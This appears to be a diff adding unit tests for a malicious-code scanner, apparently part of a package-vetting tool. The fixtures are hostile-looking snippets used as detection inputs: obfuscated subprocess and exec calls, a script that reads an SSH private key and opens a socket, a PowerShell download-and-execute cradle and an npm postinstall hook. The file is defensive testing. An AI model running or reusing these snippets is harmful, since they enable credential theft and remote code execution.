@@ -254,5 +254,65 @@ class AllowlistTests(unittest.TestCase):
             self.assertEqual(al, {'domains': [], 'suppress_rules': []})
 
 
+class StructuralAnalyzerTests(unittest.TestCase):
+    def held(self, src, name):
+        return guard.blocking(guard.inspect(src.encode() if isinstance(src, str) else src, name))
+
+    def rules(self, src, name):
+        return sorted({f['rule'] for f in guard.inspect(src.encode(), name)})
+
+    def test_python_split_string_import(self):
+        src = "import importlib\nm = importlib.import_module('sub'+'process')\n"
+        self.assertIn('process-execution', self.rules(src, 'x.py'))
+        self.assertTrue(self.held(src, 'x.py'))
+
+    def test_python_getattr_computed_name(self):
+        self.assertIn('dynamic-code', self.rules("getattr(b, 'ex'+'ec')(y)\n", 'x.py'))
+        # A plain getattr with a literal name is not flagged.
+        self.assertEqual(self.rules("getattr(obj, 'name')\n", 'x.py'), [])
+
+    def test_python_from_import_alias_resolves(self):
+        self.assertIn('process-execution', self.rules("from subprocess import Popen as P\nP(['id'])\n", 'x.py'))
+
+    def test_python_ctypes_native(self):
+        self.assertIn('native-code', self.rules("import ctypes\nctypes.windll.kernel32.VirtualAlloc(0,1,2,3)\n", 'x.py'))
+
+    def test_python_credential_plus_network_is_exfiltration(self):
+        src = ("import socket\n"
+               "k = open('/home/u/.ssh/id_rsa').read()\n"
+               "socket.create_connection(('h', 443))\n")
+        findings = guard.inspect(src.encode(), 'x.py')
+        self.assertTrue(any(f['rule'] == 'exfiltration' and f['severity'] == 'critical' for f in findings))
+
+    def test_python_benign_is_clean(self):
+        src = "import argparse\nfrom statistics import mean\nprint(mean([1, 2, 3]))\n"
+        self.assertEqual(guard.inspect(src.encode(), 'x.py'), [])
+
+    def test_python_unparseable_is_low_not_crash(self):
+        findings = guard.inspect(b"def (:\n  bad syntax\n", 'x.py')
+        self.assertTrue(any(f['rule'] == 'python-unparseable' for f in findings))
+        self.assertFalse(guard.blocking([f for f in findings if f['rule'] == 'python-unparseable']))
+
+    def test_powershell_download_cradle(self):
+        src = "$c=(New-Object Net.WebClient).DownloadString('ht'+'tps://x.invalid/p')\n& ([scriptblock]::Create($c))\n"
+        self.assertTrue(self.held(src, 'c.ps1'))
+
+    def test_powershell_encoding_flag_not_flagged(self):
+        # -Encoding is common and must not trip the -encodedcommand rule.
+        self.assertEqual(guard.inspect(b"Out-File -Encoding utf8 log.txt\n", 'c.ps1'), [])
+
+    def test_js_dynamic_require_and_child_process(self):
+        self.assertTrue(self.held("const m='fs'\nrequire(m)\n", 'a.js'))
+        self.assertTrue(self.held("require('child_process').execSync('id')\n", 'a.js'))
+
+    def test_js_benign_function_not_flagged(self):
+        # An ordinary anonymous function must not match the Function constructor.
+        self.assertEqual(guard.inspect(b"const f = function(x){ return x; };\n", 'a.js'), [])
+
+    def test_package_json_postinstall_held(self):
+        self.assertTrue(self.held('{"scripts":{"postinstall":"node x.js"}}', 'package.json'))
+        self.assertEqual(guard.inspect(b'{"scripts":{"test":"jest"}}', 'package.json'), [])
+
+
 if __name__ == '__main__':
     unittest.main()
